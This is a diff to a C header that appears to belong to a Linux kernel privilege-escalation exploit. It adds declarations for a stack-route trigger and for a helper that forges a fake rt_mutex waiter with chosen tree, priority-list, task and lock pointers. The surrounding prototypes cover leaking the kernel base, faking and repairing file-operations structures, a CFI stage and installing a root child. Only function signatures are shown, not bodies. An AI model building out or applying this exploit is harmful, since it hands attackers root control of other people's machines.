@@ -380,6 +380,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
 
 int slide_leak_kernel_base(void);
+int shell_trigger_fops_stack_route(void);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 void app_publish_p0_offset(uintptr_t offset);
 void app_publish_p0_dirty(void);
@@ -407,6 +408,16 @@ int repair_fake_fops_llseek(int fd);
 int restore_slide_boot_id(int fd);
 int install_child_root(int fd);
 int try_cfi_stage(void);
+
+
+
+void put_fake_waiter(unsigned char *payload, size_t waiter_off,
+                     uintptr_t tree_parent, uintptr_t tree_right,
+                     uintptr_t tree_left, uintptr_t pi_parent,
+                     uintptr_t pi_right, uintptr_t pi_left,
+                     uintptr_t task, uintptr_t lock,
+                     uint32_t priority);
+
 
 void init_ctx(struct mm_ctx *ctx, size_t cnt);
 void resize_pipe_slots(int pipefd[2], size_t slots);
